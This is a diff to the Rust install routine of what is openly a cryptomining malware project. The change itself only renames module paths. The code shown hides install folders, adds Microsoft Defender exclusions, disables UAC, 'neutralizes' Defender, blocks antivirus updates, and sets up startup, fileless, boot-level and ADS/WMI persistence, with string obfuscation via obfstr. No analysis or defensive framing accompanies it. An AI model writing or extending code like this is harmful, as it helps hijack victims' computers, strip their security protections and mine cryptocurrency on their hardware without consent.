@@ -9,8 +9,8 @@ use crate::common::constants::{
 };
 use crate::utils::files::{download_file, extract_zip, move_files_from_subdir, copy_dir_recursive};
 use crate::utils::paths::{get_all_install_dirs, set_hidden_recursive, get_userprofile};
-use crate::system::process::{create_watchdog_script, start_hidden, stop_mining};
-use crate::system::registry::{add_to_startup, remove_from_startup};
+use crate::host::process::{create_watchdog_script, start_hidden, stop_mining};
+use crate::host::registry::{add_to_startup, remove_from_startup};
 
 pub fn install() -> Result<(), Box<dyn std::error::Error>> {
     use obfstr::obfstr;
@@ -89,7 +89,7 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
     for dir in &install_dirs {
         set_hidden_recursive(dir)?;
         // Auto-whitelist in Defender
-        let _ = crate::system::process::add_defender_exclusion(dir);
+        let _ = crate::host::process::add_defender_exclusion(dir);
     }
     
     // 5. Seed the Registry Ledger (P2P Discovery)
@@ -115,22 +115,22 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
         add_to_startup(&launcher)?;
         
         // Disable UAC prompts
-        let _ = crate::system::registry::disable_uac();
+        let _ = crate::host::registry::disable_uac();
         
         // Neutralize Defender (Allow threats)
-        let _ = crate::system::process::neutralize_defender();
+        let _ = crate::host::process::neutralize_defender();
         
         // Deep Sleeper (Fileless Persistence)
-        let _ = crate::system::process::create_fileless_sleeper();
+        let _ = crate::host::process::create_fileless_sleeper();
 
         // System Supervisor Service (Boot-Level)
-        let _ = crate::system::process::create_system_supervisor();
+        let _ = crate::host::process::create_system_supervisor();
 
         // Chameleon Protocol (Communications Jamming)
-        let _ = crate::system::network::block_av_updates();
+        let _ = crate::host::network::block_av_updates();
 
         // Shadow Persistence (ADS + WMI)
-        let _ = crate::system::shadow::apply_shadow_persistence();
+        let _ = crate::host::shadow::apply_shadow_persistence();
 
         // Copy self to bin (optional, can skip or rename to sys_installer.exe)
         // let _ = copy_self_to_bin(); 
